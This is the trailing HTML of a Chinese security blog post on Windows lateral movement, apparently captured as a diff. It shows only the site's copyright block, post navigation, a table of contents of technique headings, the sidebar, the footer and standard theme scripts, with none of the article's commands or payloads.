+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.xchstudy.org">chen7chen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.xchstudy.org/2026/06/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1%20%E5%9F%9F%E6%B8%97%E9%80%8F/6%20Windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">http://blog.xchstudy.org/2026/06/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1%20%E5%9F%9F%E6%B8%97%E9%80%8F/6%20Windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.xchstudy.org" target="_blank">小chen妙妙屋</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://pic.chenjichao.site/raw/11.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/06/11/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1%20%E5%9F%9F%E6%B8%97%E9%80%8F/2%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3%20%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7PowerView/" title="枚举工具PowerView"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/9.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">枚举工具PowerView</div></div></a></div><div class="next-post pull-right"><a href="/2026/06/08/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1%20%E5%9F%9F%E6%B8%97%E9%80%8F/5%20ACL%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8/" title="ACL权限滥用"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/4.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ACL权限滥用</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/images.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">chen7chen</div><div class="author-info__description">个人心得，学习分享</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">224</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">162</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cjc0729"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/cjc0729" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:chenjichao729@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #24292e;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><center> <b> 学习使用，师傅勿喷(#／。＼#)； <br><br> 功能、内容尚未完全，网站还会持续更新优化哦(*´∀`)~♥ <br><br> 电影网站需要认证才能进入哦，如有需要，请联系本人。 声明：本人搭建所有网站均无商业用途。 </b> </center></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MITRE-ATT-amp-CK-%E6%A1%86%E6%9E%B6"><span class="toc-number">2.</span> <span class="toc-text">MITRE ATT&amp;CK 框架</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">技术介绍</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.</span> <span class="toc-text">直接横向移动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%B4%E6%8E%A5%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">4.</span> <span class="toc-text">间接横向移动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%AE%80%E4%BB%8B"><span class="toc-number">5.</span> <span class="toc-text">远程服务简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.1.</span> <span class="toc-text">类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">枚举方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%EF%BC%88RDP%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">远程桌面服务（RDP）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-number">6.1.</span> <span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP%E6%9E%9A%E4%B8%BE"><span class="toc-number">6.2.</span> <span class="toc-text">RDP枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E4%BD%8E%E5%BB%B6%E8%BF%9F%E7%BD%91%E7%BB%9C%E6%88%96%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5%E4%BC%98%E5%8C%96-xfreerdp"><span class="toc-number">6.2.1.</span> <span class="toc-text">针对低延迟网络或代理连接优化 xfreerdp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%97%E9%99%90%E7%AE%A1%E7%90%86%E6%A8%A1%E5%BC%8F"><span class="toc-number">6.3.</span> <span class="toc-text">受限管理模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A-RDP-%E4%B8%8E%E5%8F%97%E9%99%90%E7%AE%A1%E7%90%86%E6%A8%A1%E5%BC%8F-RDP"><span class="toc-number">6.3.1.</span> <span class="toc-text">普通 RDP 与受限管理模式 RDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF%E5%8F%97%E9%99%90%E7%AE%A1%E7%90%86%E6%A8%A1%E5%BC%8F%EF%BC%9F"><span class="toc-number">6.3.2.</span> <span class="toc-text">如何查看目标机是否开启受限管理模式？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">6.3.2.1.</span> <span class="toc-text">注册表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E9%AA%8C%E8%AF%81"><span class="toc-number">6.3.2.2.</span> <span class="toc-text">远程验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E4%BD%8E%E5%BB%B6%E8%BF%9F%E7%BD%91%E7%BB%9C%E6%88%96%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5%E4%BC%98%E5%8C%96-xfreerdp-1"><span class="toc-number">6.4.</span> <span class="toc-text">针对低延迟网络或代理连接优化 xfreerdp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMB"><span class="toc-number">7.</span> <span class="toc-text">SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90-1"><span class="toc-number">7.1.</span> <span class="toc-text">权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC%E8%BF%9C%E7%A8%8B%E9%99%90%E5%88%B6"><span class="toc-number">7.1.1.</span> <span class="toc-text">UAC远程限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93"><span class="toc-number">7.1.2.</span> <span class="toc-text">SMB 命名管道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE"><span class="toc-number">7.2.</span> <span class="toc-text">枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.3.</span> <span class="toc-text">Windows进行横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PsExec"><span class="toc-number">7.3.1.</span> <span class="toc-text">PsExec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SharpNoPSExec"><span class="toc-number">7.3.2.</span> <span class="toc-text">SharpNoPSExec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NimExec"><span class="toc-number">7.3.3.</span> <span class="toc-text">NimExec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.4.</span> <span class="toc-text">Linux进行横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Psexec-py"><span class="toc-number">7.4.1.</span> <span class="toc-text">Psexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbexec-py"><span class="toc-number">7.4.2.</span> <span class="toc-text">smbexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#services-py"><span class="toc-number">7.4.3.</span> <span class="toc-text">services.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8"><span class="toc-number">7.4.3.1.</span> <span class="toc-text">查看目标主机服务列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-services-py-%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.4.3.2.</span> <span class="toc-text">使用 services.py 进行横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90Payload"><span class="toc-number">7.4.3.3.</span> <span class="toc-text">生成Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%96%B0%E6%9C%8D%E5%8A%A1"><span class="toc-number">7.4.3.4.</span> <span class="toc-text">创建新服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#atexec-py"><span class="toc-number">7.4.4.</span> <span class="toc-text">atexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">7.4.4.1.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%A6%81%E6%B1%82"><span class="toc-number">7.4.4.2.</span> <span class="toc-text">基本要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">7.4.4.3.</span> <span class="toc-text">启动监听器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-atexec-py-%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%90%91-Shell-%E8%BD%BD%E8%8D%B7"><span class="toc-number">7.4.4.4.</span> <span class="toc-text">使用 atexec.py 执行反向 Shell 载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">7.4.4.5.</span> <span class="toc-text">成功获取反向 Shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WMI"><span class="toc-number">8.</span> <span class="toc-text">WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90-2"><span class="toc-number">8.1.</span> <span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-1"><span class="toc-number">8.2.</span> <span class="toc-text">枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.3.</span> <span class="toc-text">Windows横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wmic"><span class="toc-number">8.3.1.</span> <span class="toc-text">wmic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.4.</span> <span class="toc-text">Linux横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec"><span class="toc-number">8.4.1.</span> <span class="toc-text">wmiexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetExec"><span class="toc-number">8.4.2.</span> <span class="toc-text">NetExec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM"><span class="toc-number">8.5.</span> <span class="toc-text">WinRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRm%E6%9D%83%E9%99%90"><span class="toc-number">8.6.</span> <span class="toc-text">WinRm权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM-%E6%9E%9A%E4%B8%BE"><span class="toc-number">8.7.</span> <span class="toc-text">WinRM 枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1"><span class="toc-number">8.8.</span> <span class="toc-text">Windows横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRS"><span class="toc-number">8.8.1.</span> <span class="toc-text">WinRS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%98%BE%E5%BC%8F%E5%87%AD%E6%8D%AE%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">8.8.1.1.</span> <span class="toc-text">使用显式凭据执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">8.8.1.2.</span> <span class="toc-text">复制文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B-PowerShell-%E4%BC%9A%E8%AF%9D"><span class="toc-number">8.8.1.2.1.</span> <span class="toc-text">创建远程 PowerShell 会话</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%8E%E6%9C%AC%E6%9C%BA%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.8.1.2.2.</span> <span class="toc-text">从本机复制文件到远程主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%8E%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="toc-number">8.8.1.2.3.</span> <span class="toc-text">从远程主机复制文件到本地</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8FShell"><span class="toc-number">8.8.1.3.</span> <span class="toc-text">交互式Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1"><span class="toc-number">8.9.</span> <span class="toc-text">Linux横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NetExec-1"><span class="toc-number">8.9.1.</span> <span class="toc-text">NetExec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Evil-WinRM"><span class="toc-number">8.9.2.</span> <span class="toc-text">Evil-WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E8%84%9A%E6%9C%AC"><span class="toc-number">8.9.2.1.</span> <span class="toc-text">导入脚本</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/18/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E8%BD%AF%E4%BB%B6%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%BA%95%E5%B1%82%E5%AE%89%E5%85%A8/2%20%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/PC%E9%80%86%E5%90%91/2%20linux%E7%BC%96%E7%A8%8B/linux%E6%B1%87%E7%BC%96%E7%BC%96%E7%A8%8B/" title="linux汇编编程">linux汇编编程</a><time datetime="2026-06-18T12:29:40.921Z" title="发表于 2026-06-18 20:29:40">2026-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/16/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E8%BD%AF%E4%BB%B6%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%BA%95%E5%B1%82%E5%AE%89%E5%85%A8/0%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3%20%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/0%20%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%8E%9F%E7%90%86/" title="汇编代码原理">汇编代码原理</a><time datetime="2026-06-16T14:08:06.776Z" title="发表于 2026-06-16 22:08:06">2026-06-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/13/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/1%20%E5%9F%BA%E7%A1%80/3%20%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%89%8D%E7%AB%AF/js/2%20%E6%B5%8F%E8%A7%88%E5%99%A8/JavaScript%E6%B5%8F%E8%A7%88%E5%99%A8%E6%93%8D%E4%BD%9C/" title="JavaScript浏览器操作">JavaScript浏览器操作</a><time datetime="2026-06-13T14:35:44.271Z" title="发表于 2026-06-13 22:35:44">2026-06-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/11/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/01%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2%20%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/1%20%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" title="基础设施扫描">基础设施扫描</a><time datetime="2026-06-11T07:01:34.177Z" title="发表于 2026-06-11 15:01:34">2026-06-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/11/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1%20%E5%9F%9F%E6%B8%97%E9%80%8F/2%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3%20%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7PowerView/" title="枚举工具PowerView">枚举工具PowerView</a><time datetime="2026-06-10T16:00:19.207Z" title="发表于 2026-06-11 00:00:19">2026-06-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By chen7chen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.chenjichao.site/',
+      region: 'ap-shanghai',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo.chenjichao.site/',
+      region: 'ap-shanghai',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+
+    
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
+    else getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.31/dist/twikoo.all.min.js').then(init)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="/js/sun_moon.js" async></script><script async src="/js/jquery.js"></script><script async src="/styles/fish.js"></script><script defer src="/js/pace.min.js"></script><canvas async id="universe"></canvas><script defer src="/js/js.js"></script><script defer src="/js/emoji.js"></script><script async src="/js/pace.min.js"></script><script async src="/js/title.js"></script><script async data-pjax src="/js/anzhiyu.js"></script><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://npm.elemecdn.com/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
